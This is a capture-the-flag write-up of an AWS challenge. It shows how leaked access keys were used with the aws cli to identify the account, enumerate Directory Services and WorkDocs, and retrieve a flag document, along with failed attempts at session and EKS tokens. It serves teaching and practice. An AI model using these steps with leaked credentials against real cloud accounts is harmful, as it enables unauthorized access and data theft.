# HTB Business CTF 2024 - The Vault of Hope
HACKTHEBOX puts up this fun yearly CTF in which you join your organizations teamn to solve challenges and compete against other companies security teams.

I enjoy Cloud shenanigans, and so that's where I put my efforts. This is one of the challenges I solved and I thought it would be responsible of me to share my approach as I got good feedback from others folks about it and they found it insightful.

# Protrude Challenge (AWS based)
> [!INFO] Challenge
> We have obtained leaked account pertaining to Vault 101, with suspicion that it may be linked to one of the leaders group. Your task is to enumerate and see if we can infiltrate them internally.

#### The Creds were in a zip file containing a CSV:
##### Access Key ID
```Text
AKIAXYAFLIG2JE6MC2SY
```
##### Secret Access Key
```Text
teWVv0GzIBKS23uozxUGmUH+[...]
```
##### Region name 
```Text
us-east-1
```

# Rabbit Hole üêáTo Flag üèÅ üèÜ
### What are these creds for?
Searched for "Access Key  Secret access key"  and found this:
- https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-envvars.html
	- https://stackoverflow.com/questions/57550366/what-is-the-aws-access-key-id-aws-secret-access-key
### Installed `awscli` & Exported Credentials to environment variables
- Installed `awscli` , used for running commands with the given credentials
- The `awscli` will check for these environment variables and use them for Auth.   
    
#### Some basic **whoami** type commands:
```Shell
aws sts get-caller-identity
```
```JSON
{
    "UserId": "AIDAXYAFLIG2E6UQ3YIVB",
    "Account": "532587168180",
    "Arn": "arn:aws:iam::532587168180:user/aalmodovar"
}
```
### Permission Enumeration/Checking
Check page for available permissions and tooling.    
    
### Directory Services
Using one of the commands found above via Permission Enumeration, we could list some information about Directory services
As part of the Directory Services, I found it had a URL:
```JSON
"AccessUrl": "vault101.awsapps.com"
```    
#### Tool - aws cli:
 Command for checking this:
```Shell
aws --profile default --region us-east-1 ds describe-directories
```
##### Output
```JSON
aws --profile default --region us-east-1 ds describe-directories

        }
    ]
}
```
    
### vault101.awsapps.com
Visited the "AccessUrl": "vault101.awsapps.com".When you visit that endpoint, you are quickly redirected to log in to **WorkDocs**, which is part of the clue.
- I tried accessing the console, by attempting to exchange the **SessionToken** for a **`SigninToken`** using AWS Federation to Access Resources. However, we did not have the necessary permissions üò¢   
    
### WorkDocs... üèÅ
Doing some WorkDocs recon, I found we had access to list the documents using the aws cli.
#### Tool - aws cli
```Shell
aws workdocs describe-activities --organization-id d-9067e0513b
```
```JSON
{
    "UserActivities": [
        {
            "Type": "DOCUMENT_VERSION_VIEWED",
            "TimeStamp": "2024-05-19T06:15:32.835000-07:00",
            "IsIndirectActivity": false,
            "Initiator": {
                "Id": "S-1-5-21-1692074632-1250882497-497425265-500&d-9067e0513b"
            },
            "ResourceMetadata": {
                "Type": "document",
                "Name": "flag.txt",
                "Id": "5347a27512a4f5a1c0ed4b7e965210deecbb6b806a23034ce799614ca32a8303",
                "Owner": {
                    "Id": "S-1-5-21-1692074632-1250882497-497425265-500&d-9067e0513b"
                }
            }
        }, ...
```
- Listing the documents showed a "flag.txt" file, well many really.

### Getting the flag üèÅ!
I leveraged the Id of one of them to retrieve the information and a URL for that document:
```Shell
aws workdocs get-document --document-id 5347a27512a4f5a1c0ed4b7e965210deecbb6b806a23034ce79
```

The document had the üèÅ flag! üèÜ

# Rabbit Holes üê∞ to distractions.... üò¢
Not everything was so straight forward and I went on a few rabbit holes to no where....

#### Found a way to get an `SessionToken` as well (through the Permission Enumeration)
```Shell
aws --profile default --region us-east-1 sts get-session-token
aws sts get-session-token --duration-seconds 86400
```

#### Found some EKS Credentials!
Through one of the permissions, it gives you the command to get an eks access token. See [[Protrude-eks_enumeration]]
- However, we do not have the URL for the Kubernetes Cluster API Endpoint
- Attempted crafting the URL manually with no luck
- I also tried running the command to get a `kubeconfig` file, but we do not have permissions for that either.

# Visual of the Attack Path:
This is a visual representation of some of the activities involved with trying to obtain the flag and following the green arrows is the "happy" path to the flag.
